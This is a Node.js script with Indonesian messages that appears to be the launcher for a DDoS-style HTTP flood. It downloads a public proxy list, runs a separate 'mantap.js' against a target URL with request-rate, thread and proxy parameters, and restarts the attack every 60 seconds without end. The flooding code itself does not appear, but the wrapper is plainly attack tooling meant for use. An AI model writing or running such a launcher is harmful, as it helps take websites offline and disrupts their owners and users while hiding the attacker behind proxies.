const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');

function downloadProxies(url, filePath) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(filePath);
        https.get(url, (response) => {
            if (response.statusCode !== 200) {
                reject(`Gagal mendownload proxy, status code: ${response.statusCode}`);
                return;
            }
            response.pipe(file);
            file.on('finish', () => {
                file.close(resolve);
            });
        }).on('error', (err) => {
            reject(`Terjadi error saat mendownload proxy: ${err.message}`);
        });
    });
}

async function runMantapScript(targetUrl) {
    const proxyFile = path.resolve('proxy.txt'); 
    const proxyUrl = 'https://raw.githubusercontent.com/Monosans/proxy-list/main/proxies.txt'; // Ganti dengan URL proxy yang sesuai

    if (!fs.existsSync(proxyFile) || fs.statSync(proxyFile).size === 0) {
        console.log("File proxy.txt tidak ditemukan atau kosong. Mengunduh daftar proxy...");
        try {
            await downloadProxies(proxyUrl, proxyFile);
            console.log("Proxy berhasil diunduh dan disimpan.");
        } catch (error) {
            console.error(error);
            return;
        }
    }

    const timeBeforeRequest = 150; 
    const reqPerSec = 8; 
    const threads = 5; 

    console.log(`Menjalankan mantap.js dengan:`);
    console.log(`- Target URL: ${targetUrl}`);
    console.log(`- Waktu selama ${timeBeforeRequest} detik`);
    console.log(`- Request per detik: ${reqPerSec}`);
    console.log(`- Threads: ${threads}`);
    console.log(`- Menggunakan file proxy.txt: ${proxyFile}`);

    const process = spawn('node', ['mantap.js', targetUrl, timeBeforeRequest, reqPerSec, threads, proxyFile]);

    process.stdout.on('data', (data) => {
        console.log(`Output: ${data}`);
    });

    process.stderr.on('data', (data) => {
        console.error(`Error: ${data}`);
    });

    process.on('close', (code) => {
        console.log(`mantap.js selesai dijalankan dengan kode keluar: ${code}`);
        console.log("Script akan di-restart dalam 60 detik...");
        setTimeout(() => runMantapScript(targetUrl), 60000); 
    });

    process.on('error', (err) => {
        console.error('Terjadi error saat menjalankan mantap.js:', err);
    });
}

// Ambil target URL dari argumen command line
const targetUrl = process.argv[2]; // Mendapatkan target URL dari argumen pertama (setelah 'node hold.js')

if (!targetUrl) {
    console.error("Harap masukkan target URL.");
    process.exit(1);
}

runMantapScript(targetUrl);